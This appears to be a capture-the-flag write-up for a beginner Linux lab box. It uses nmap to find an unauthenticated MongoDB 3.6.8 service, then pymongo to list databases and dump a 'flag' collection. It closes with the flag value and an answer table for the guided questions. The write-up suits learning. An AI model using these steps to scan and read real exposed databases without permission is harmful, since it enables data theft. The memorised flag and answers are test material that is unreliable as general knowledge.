# Mongod

|            |                                                                                  |
|------------|----------------------------------------------------------------------------------|
| Track      | Starting Point - Tier 0                                                          |
| Difficulty | Very Easy                                                                        |
| OS         | Linux                                                                            |
| Tags       | MongoDB, Databases, Reconnaissance, Misconfiguration, Anonymous Access           |
| Tools      | `nmap`, `mongo` shell or `pymongo` + `ipython`                                   |

## Summary

An exposed MongoDB 3.6.8 instance with no auth. List databases, find the
`sensitive_information` DB, read the `flag` collection.

## Notes

- [MongoDB Command Reference](https://www.mongodb.com/docs/manual/reference/command/)

## Recon

Full TCP scan:

```bash
nmap -p- -sT --min-rate 3000 10.129.58.99
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
27017/tcp open  mongod
```

Version probe:

```bash
nmap -sV -p 27017 10.129.58.99
```

```
PORT      STATE SERVICE VERSION
27017/tcp open  mongodb MongoDB 3.6.8
```

## Foothold

No auth, connect directly. I used `pymongo` from `ipython` since it's easy to
script later, but the regular `mongo` shell would work the same way.

```python
> python3 -m pip install pymongo ipython
> ipython
In [1]: from pymongo import MongoClient
In [2]: client = MongoClient('10.129.58.99', 27017)

In [3]: print(client.list_database_names())
['admin', 'config', 'local', 'sensitive_information', 'users']

In [4]: database = client.sensitive_information
In [5]: database.list_collection_names()
Out[5]: ['flag']

In [6]: [print(x) for x in database['flag'].find()]
{'_id': ObjectId('630e3dbcb82540ebbd1748c5'), 'flag': '1b6e6fb359e7c40241b6d431427ba6ea'}
```

## Flag

```
1b6e6fb359e7c40241b6d431427ba6ea
```

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | How many TCP ports are open on the machine? | 2 |
| 2 | Which service is running on port 27017 of the remote host? | mongodb 3.6.8 |
| 3 | What type of database is MongoDB? | NoSQL |
| 4 | What is the command name for the Mongo shell that is installed with the mongodb-clients package? | mongo |
| 5 | What is the command used for listing all the databases present on the MongoDB server? | show databases |
| 6 | What is the command used for listing out the collections in a database? | show collections |
| 7 | What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read? | `db.flag.find().pretty()` |
| Flag | Submit Root Flag | `1b6e6fb359e7c40241b6d431427ba6ea` |
